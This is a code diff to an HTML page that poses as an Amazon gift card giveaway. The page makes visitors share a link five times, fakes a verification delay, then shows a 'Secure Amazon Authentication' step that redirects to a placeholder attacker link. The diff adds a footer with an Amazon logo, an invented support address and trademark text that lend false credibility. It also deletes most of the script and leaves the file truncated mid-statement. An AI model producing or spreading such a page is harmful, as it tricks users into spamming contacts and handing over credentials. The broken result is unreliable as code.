@@ -16,6 +16,7 @@
             background: linear-gradient(135deg, #232F3E 0%, #FF9900 100%);
             min-height: 100vh;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             padding: 20px;
@@ -470,6 +471,68 @@
             content: "🔒";
             font-size: 16px;
         }
+
+        /* Footer Styles */
+        .footer {
+            background: white;
+            border-radius: 20px;
+            padding: 30px 20px;
+            max-width: 500px;
+            width: 95%;
+            margin: 20px auto 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+
+        @media (max-width: 480px) {
+            .footer {
+                padding: 20px 15px;
+                width: 90%;
+            }
+        }
+
+        .footer-content {
+            border-top: 2px solid #f0f0f0;
+            padding-top: 20px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #232F3E;
+            text-decoration: none;
+            font-size: 12px;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #FF9900;
+        }
+
+        .footer-contact {
+            margin: 15px 0;
+            color: #666;
+            font-size: 12px;
+            line-height: 1.6;
+        }
+
+        .footer-copyright {
+            color: #999;
+            font-size: 11px;
+            margin-top: 15px;
+        }
+
+        .footer-logo {
+            width: 80px;
+            margin-bottom: 15px;
+            opacity: 0.7;
+        }
     </style>
 </head>
 <body>
@@ -553,6 +616,35 @@
 
         <div class="security-badge">
             <span id="securityText">Secure Amazon Authentication</span>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <div class="footer">
+        <div class="footer-content">
+            <svg class="footer-logo" viewBox="0 0 603 182" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#232F3E" d="M374.3 141.5c-53.7 39.7-131.6 60.8-198.7 60.8-94 0-178.8-34.8-242.8-92.6-5-4.5-.5-10.7 5.5-7.2 69 40.2 154.2 64.4 242.2 64.4 59.4 0 124.7-12.3 184.8-37.8 9-3.8 16.5 5.9 9 12.4z"/>
+                <path fill="#232F3E" d="M387.5 126.2c-6.9-8.8-45.4-4.2-62.7-2.1-5.3.6-6.1-4-1.3-7.4 30.7-21.6 81-15.4 86.9-8.1 5.8 7.3-.6 58-30.5 82.2-4.6 3.7-8.9 1.7-6.9-3.2 6.5-16.4 21.1-53 14.5-61.4z"/>
+            </svg>
+            
+            <div class="footer-links">
+                <a href="#">Terms of Service</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Help Center</a>
+                <a href="#">Contact Us</a>
+            </div>
+            
+            <div class="footer-contact">
+                <strong>Customer Support:</strong><br>
+                Email: support@amazongiftpromo.com<br>
+                Phone: 1-800-555-0199<br>
+                Hours: 24/7 Support Available
+            </div>
+            
+            <div class="footer-copyright">
+                © 2026 Amazon Gift Card Promotions. All Rights Reserved.<br>
+                Amazon and the Amazon logo are trademarks of Amazon.com, Inc. or its affiliates.
+            </div>
         </div>
     </div>
 
@@ -663,95 +755,4 @@
                     text: shareText,
                     url: window.location.href
                 }).then(() => {
-                    console.log('Shared successfully');
-                }).catch((error) => {
-                    console.log('Error sharing:', error);
-                    fallbackCopy(shareText);
-                });
-            } else {
-                fallbackCopy(shareText);
-            }
-            
-            hasShared = true;
-            
-            const btn = document.getElementById('shareBtn');
-            document.getElementById('shareBtnText').textContent = t.shareBtnVerifying;
-            btn.style.opacity = '0.7';
-            btn.style.cursor = 'wait';
-            
-            shareTimer = setTimeout(() => {
-                shareCount = 5;
-                updateProgress();
-                document.getElementById('shareBtnText').textContent = t.shareBtnVerified;
-                btn.style.background = '#00b894';
-                btn.style.cursor = 'not-allowed';
-            }, 10000);
-        }
-        
-        function fallbackCopy(text) {
-            const textArea = document.createElement('textarea');
-            textArea.value = text;
-            textArea.style.position = 'fixed';
-            textArea.style.left = '-999999px';
-            document.body.appendChild(textArea);
-            textArea.select();
-            try {
-                document.execCommand('copy');
-                alert(currentLang === 'en' ? 'Link copied! Share it with friends!' : '¡Enlace copiado! ¡Compártelo con amigos!');
-            } catch (err) {
-                console.error('Could not copy text: ', err);
-            }
-            document.body.removeChild(textArea);
-        }
-        
-        function updateProgress() {
-            const percentage = (shareCount / 5) * 100;
-            document.getElementById('progress').style.width = percentage + '%';
-            document.getElementById('progress').textContent = `${shareCount}/5`;
-            document.getElementById('shareCount').textContent = `${shareCount}/5`;
-            
-            if (shareCount >= 5) {
-                const t = translations[currentLang];
-                const claimBtn = document.getElementById('claimBtn');
-                claimBtn.classList.add('active');
-                claimBtn.style.cursor = 'pointer';
-                document.getElementById('claimBtnText').textContent = t.claimBtnActive;
-            }
-        }
-        
-        function attemptClaim() {
-            if (shareCount >= 5) {
-                const t = translations[currentLang];
-                
-                document.getElementById('spinner').style.display = 'block';
-                document.getElementById('claimBtnText').textContent = t.claimBtnProcessing;
-                
-                setTimeout(() => {
-                    document.getElementById('spinner').style.display = 'none';
-                    showLoginPage();
-                }, 2000);
-            }
-        }
-
-        function showLoginPage() {
-            const t = translations[currentLang];
-            
-            document.getElementById('congratsTitle').textContent = t.congratsTitle;
-            document.getElementById('congratsSubtitle').textContent = t.congratsSubtitle;
-            document.getElementById('rewardText').textContent = t.rewardText;
-            document.getElementById('instructionText').textContent = t.instructionText;
-            document.getElementById('signinBtnText').textContent = t.signinBtnText;
-            document.getElementById('securityText').textContent = t.securityText;
-            
-            document.getElementById('mainPage').classList.add('hide');
-            document.getElementById('loginPage').classList.add('show');
-        }
-
-        function redirectToLogin() {
-            if (REDIRECT_URL && REDIRECT_URL !== 'PUT YOUR LINK HERE') {
-                window.location.href = REDIRECT_URL;
-            }
-        }
-    </script>
-</body>
-</html>
+                    console.log('
